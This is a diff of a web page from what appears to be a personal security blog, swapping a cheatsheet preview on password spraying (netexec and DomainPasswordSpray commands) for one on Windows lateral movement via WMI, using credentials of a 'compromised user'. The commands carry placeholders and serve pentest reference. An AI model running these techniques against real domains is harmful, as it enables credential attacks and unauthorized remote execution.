@@ -531,17 +531,13 @@ To get the correct version of glibc it is possible to run the libc file itself s
   </header>
   <div>
     <div><p>Related to: <a href="https://ojack69.github.io/jacks-corner/ad/active-directory.html">Active Directory</a></p>
-<h2 id="initial-attack-vectors">Initial Attack Vectors</h2>
-<h3 id="password-spraying">Password Spraying</h3>
-<p>Password spraying remotely with <code>netexec</code>:</p>
-<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;users<span class="w"> </span>list&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password<span class="p">|</span>password<span class="w"> </span>list&gt;<span class="w"> </span>--no-bruteforce
+<h2 id="lateral-movements">Lateral Movements</h2>
+<h3 id="wmi">WMI</h3>
+<p>Run remote process (from cmd):</p>
+<div class="highlight"><pre><span></span><code>wmic.exe<span class="w"> </span>/user:&lt;username&gt;<span class="w"> </span>/password:&lt;password&gt;<span class="w"> </span>/node:&lt;target<span class="w"> </span>computer&gt;<span class="w"> </span>process<span class="w"> </span>call<span class="w"> </span>create<span class="w"> </span><span class="s2">"&lt;command&gt;"</span><span class="w"> </span>
 </code></pre></div>
-<p>Password spraying with <a href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray</a>:</p>
-<div class="highlight"><pre><span></span><code><span class="c"># On the whole domain</span>
-<span class="nb">Invoke-DomainPasswordSpray</span> <span class="n">-Password</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span>
-
-<span class="c"># Generate a list of users not disabled and not potentially lockable</span>
-<span class="nb">Get-DomainUserList</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">domain …</span></code></pre></div></div>
+<p>Create a <code>PSCredential</code> object with the credentials of a compromised user to be used to create a persistent WMI session:</p>
+<div class="highlight"><pre><span></span><code><span class="nv">$sPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span> <span class="n">-AsPlainText</span> <span class="n">-Force …</span></code></pre></div></div>
     <br>
     <a class="btn" href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html">
       Continue reading
